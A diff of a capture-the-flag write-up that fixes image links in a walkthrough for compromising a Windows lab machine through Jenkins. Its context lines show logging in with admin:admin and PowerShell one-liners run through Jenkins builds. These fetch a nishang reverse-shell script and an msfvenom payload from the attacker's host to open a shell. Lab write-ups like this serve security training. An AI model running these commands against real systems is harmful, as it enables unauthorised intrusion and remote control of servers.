@@ -42,15 +42,15 @@ Nmap done: 1 IP address (1 host up) scanned in 2126.11 seconds
 ```
 
 ### website
-![website](website)
+![website](website.png)
 There isn't much here...
 
-![website8080](website8080)
+![website8080](website8080.png)
 Gives us a Jenkins login.
 
 The default password seems to be 'password' but this doesn't work. Try some basic logins and find **admin:admin** works.
 
-![pannel](jenkinspannel)
+![pannel](jenkinspannel.png)
 
 
 ### executing system commands from jenkins
@@ -59,12 +59,12 @@ http://10.10.21.16:8080/job/project/configure
 
 Select 'Save' and then select 'Build Now'.
 
-![jenkins batch](jenkins_batch_conflig)
+![jenkins batch](jenkins_batch_conflig.png)
 
-![jenkins build](jenkins_build_now)
+![jenkins build](jenkins_build_now.png)
 
 And output can be viewed by clicking one of the builds in build history, then clicking 'Console Output'.
-![jenkins console output](jenkins_console_output)
+![jenkins console output](jenkins_console_output.png)
 
 ### jenkins console to spawn a shell
 
@@ -72,7 +72,7 @@ We will use [nishang](https://github.com/samratashok/nishang) to get access.
 
 We will start by hosting a simple server in the location of our nishang shell.
 
-![hosting nishang](hosting_nishang)
+![hosting nishang](hosting_nishang.png)
 
 Also start a `nc` listener.
 
@@ -85,11 +85,11 @@ Now execute the following system commands through jenkins.
 
 `powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port`. What this does is download our shell and then opens it, giving us a connection to the system.
 
-![execute shell](execute_shell)
+![execute shell](execute_shell.png)
 
 Save and Build Now and check our listner.
 
-![netcat shell spawned](shell_established)
+![netcat shell spawned](shell_established.png)
 
 `user.txt` can be found in `C:\Users\bruce\desktop`.
 
@@ -106,20 +106,20 @@ We can use msfvenom to generate a new shell.
 
 Then we use `exploit/multi/handler`.
 
-![handler set-up](set_up_handler)
+![handler set-up](set_up_handler.png)
 
 Don't forget to hit `run`.
 
 
 Put `powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.10.136.172:8000/shell.exe','shell.exe')"` into the commands to execute.
 
-![upload meterpreter](build_meterpreter)
+![upload meterpreter](build_meterpreter.png)
 
 And then use 'Build Now'.
 
 Repeat with command `shell.exe` or whatever your shell is named.
 
-![meterpreter established](meterpreter_established)
+![meterpreter established](meterpreter_established.png)
 
 ## privilege escalation
 
